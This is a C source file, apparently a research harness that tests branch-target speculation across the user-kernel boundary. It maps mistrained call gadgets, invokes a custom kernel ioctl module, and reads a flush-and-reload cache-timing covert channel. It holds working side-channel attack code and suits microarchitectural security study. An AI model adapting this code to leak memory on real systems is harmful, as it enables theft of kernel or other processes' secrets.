#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#include <syscall.h>
#include "ap_ioctl.h"
#include "bp_tools.h"
#define CACHE_THRESHHOLD 80

// gcc -g -O0  -fno-pie -no-pie -o btb_speculation_test btb_speculation_test.c 

/*
    "a"(value) → %rax 레지스터에 넣음 (또는 rax으로 지정)

    "D"(value) → %rdi

    "S"(value) → %rsi

    "d"(value) → %rdx

    "b"(value) → %rbx

    "c"(value) → %rcx

    "r"(value) → 임의의 일반 목적 레지스터 (컴파일러가 선택)
*/

#define my_snip(name,code)                      \
    asm(".pushsection .text\n"                  \
        ".balign 0x1000\n"                    \
        ".global " #name "_start\n"             \
        ".type " #name "_start, @function\n"    \
        #name "_start:\n"                       \
        code                                    \
        "\n" #name "_end:\n"                    \
        ".popsection\n");

my_snip(br_src_call,
    // BHB setup
    BHB_SETUP(194, 0x10 - 2)
    "nop\n"
    "lfence\n"
    "addq $1536, %rcx\n" // rcx = &probe[3*256]
    // increase speculation window
    "clflush (%rbx)\n"
    "lfence\n"
    // mistrained call
    "call *%rbx\n"
    "ret\n"
)

// signal sender in covert channel
my_snip(sig_gadget,
    // "movzbl (%rbx), %eax\n"  // movzbl (suffix l = 32 bit)을 사용하였기 때문에 eax로 load 해야 함.
    "mov (%rcx), %rcx\n" // load probe[dummy]
    "syscall\n"   // syscall for context switch
    "ret\n"
    )

my_snip(test_gadget,
    "lfence\n"
    "movzbl (%rbx), %eax\n"
    "ret\n"
    )

my_snip(victim_dst,
    //"mov (%rcx), %rcx\n" // load probe[secret]
    "ret\n")


unsigned long br_src_addr;
unsigned long sig_gadget_addr;
unsigned long victim_dst_addr;

extern unsigned char br_src_call_start[];
extern unsigned char br_src_call_end[];

extern unsigned char sig_gadget_start[];
extern unsigned char sig_gadget_end[];

extern unsigned char victim_dst_start[];
extern unsigned char victim_dst_end[];

int result[256];


unsigned long map_code(unsigned long addr, void* code_addr, size_t code_size){
    unsigned long base = addr & ~0xfff;
    size_t page_sz = (size_t)getpagesize();
    size_t offset = addr & 0xfff;
    size_t map_len = (offset + code_size + page_sz - 1) & ~(page_sz - 1);

    void* page = mmap((void*)base, map_len,
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED_NOREPLACE,
                      -1, 0);

    if(page == MAP_FAILED){
        perror("MMAP");
        return (unsigned long)-1;
    }

    memcpy((char*)page + offset, code_addr, code_size);
    return (unsigned long)((char*)page + offset);
}

void flush_array(uint8_t* probe){
    for(int i = 0; i < 256; i++)
        _mm_clflush(&probe[i *512]);
}

struct ap_payload p;

void set_brc_src_call_by_victim(void *probe){
    
    asm volatile(
        "call *%%rdx\n"
        :
        : "d"(br_src_addr),"b"(victim_dst_addr), "c"(probe)
    );

    /* mark that we executed this function in kernel context */
    //jumped_marker = probe;
}
// 0x7ffffffddca0 probe
// kernel은 probe[8*512] load, adversary는 probe[3*512] load
void call_gadget(uint8_t *probe){
    p.fptr = set_brc_src_call_by_victim;
    p.data = probe;
    //p.br_src_addr = br_src_addr;
    //p.v_dst_addr = victim_dst_start;
    asm volatile(
        "call *%0\n"
        :
        : "r"(br_src_addr),"a"(SYS_ioctl) , "D" (fd_ap), "S" (AP_IOCTL_RUN),"d"(&p), //syscall (ioctl에 들어갈 인자)
         "b"(sig_gadget_addr),"c"(probe + 1024)
        : "r8", "r11", "memory"
        //: "rcx", "r11", "memory"  // 클로버 : asm 내부에서 호출/syscall하는 경우
                    //  컴파일러가 레지스터 어쩌구 문제 발생 가능(syscal는 rcx, r11 덮어씀)
    );
}
// kpti(meltdown)
// 
int find_cached_index(int* arr){
    int max_score = 0;
    int index = -1;

    for(int i = 0; i <256; i++){
        if(arr[i] > max_score){
            max_score = arr[i];
            index = i;
        }
    }
    return index;
}

uint64_t check_latency(uint8_t* probe,int index){
    unsigned int junk;
    volatile uint8_t *addr;
    register uint64_t t1, t2;

    addr = &probe[index * 512];

    t1 = __rdtscp(&junk);
    junk = *addr;
    t2 = __rdtscp(&junk);

    return t2 - t1;
}

void reload(uint8_t* probe){
    for(int i = 0; i <256; i++){
        int mix_i;
        mix_i = ((i * 167) + 13) & 255;

        if(check_latency(probe,mix_i) < CACHE_THRESHHOLD)
            result[mix_i]++;
    }
}

void run(uint8_t* probe){

    for(int tries = 0; tries < 1000; tries++){
        flush_array(probe);

        call_gadget(probe);
        
        reload(probe);
    }
    printf("user value : 5, kernel value : 3\n");
    printf("first cached index is %d\n",find_cached_index(result));
    result[find_cached_index(result)] = +1;
    printf("second cached index is %d\n", find_cached_index(result));
}

int main(void){
    size_t br_src_code_tmpl_size = (size_t)(br_src_call_end - br_src_call_start);
    size_t sig_gadget_tmpl_size = (size_t)(sig_gadget_end - sig_gadget_start);
    size_t victim_dst_tmpl_size = (size_t)(victim_dst_end - victim_dst_start);

    uint8_t probe[256 *512];

    srandom(getpid());
    for(int i = 0; i <256;i++) result[i] = 0;
    ap_init();

    do{
        br_src_addr = ((unsigned long)random() << 16) ^ random();
        br_src_addr = map_code(br_src_addr, br_src_call_start, br_src_code_tmpl_size);
    } while (br_src_addr == (unsigned long)-1);

    do{
        sig_gadget_addr = ((unsigned long)random() << 16) ^ random();
        sig_gadget_addr = map_code(sig_gadget_addr, sig_gadget_start, sig_gadget_tmpl_size);
    } while (sig_gadget_addr == (unsigned long)-1);

    do{
        victim_dst_addr = ((unsigned long)random() << 16) ^ random();
        victim_dst_addr = map_code(victim_dst_addr,victim_dst_start, victim_dst_tmpl_size);
    } while(victim_dst_addr == (unsigned) - 1);

    /* kernel context에서 점프 잘 했는지 확인. */
    /* result : kernel 점프 확인, 인자 확인 */
    /*
    if (getenv("VERIFY")) {
        call_gadget(probe);
        printf("%px\n", (void*)probe);
        printf("br_src = %px\n",br_src_addr);
        printf("v_dst = %px\n",victim_dst_addr);
        return 0;
    }
    */
    
    run(probe);

    return 0;
}
